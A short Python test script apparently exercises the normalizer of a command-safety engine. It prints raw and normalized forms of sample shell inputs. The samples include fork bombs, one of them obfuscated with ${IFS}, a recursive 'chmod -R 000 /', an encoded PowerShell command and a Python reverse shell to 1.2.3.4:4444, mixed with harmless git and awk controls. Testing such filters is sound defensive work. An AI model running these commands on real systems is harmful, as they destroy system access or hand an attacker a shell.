# -*- coding: utf-8 -*-
import sys
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT))

from qingxiaotuan.ext.safety_engine import _normalize, _MEDIUM_PATTERNS, _CRITICAL_PATTERNS

tests = [
    "bomb()${IFS}$9{${IFS}$9bomb${IFS}$9|${IFS}$9bomb${IFS}$9&${IFS}$9};${IFS}$9bomb",
    ":(){ :|:& };:",
    "bomb(){ bomb|bomb& }; bomb",
    "echo${IFS}$9ok;${IFS}$9chmod${IFS}$9-R${IFS}$9000${IFS}$9/",
    "powershell -enc OgAgAD4AIAAvAGUAdABjAC8AcABhAHMAcwB3AGQA -NoProfile",
    "python3 -c \"import socket,subprocess,os; s=socket.socket(); s.connect(('1.2.3.4',4444)); subprocess.call(['/bin/sh'])\"",
    "git branch -D feature/x",
    "git status",
    "awk '{print $1 | \"sort\"}' data.txt",
    "awk '{print $1}' data.txt",
]
for t in tests:
    n = _normalize(t)
    print(f"RAW  : {t}")
    print(f"NORM : {n!r}")
    print()
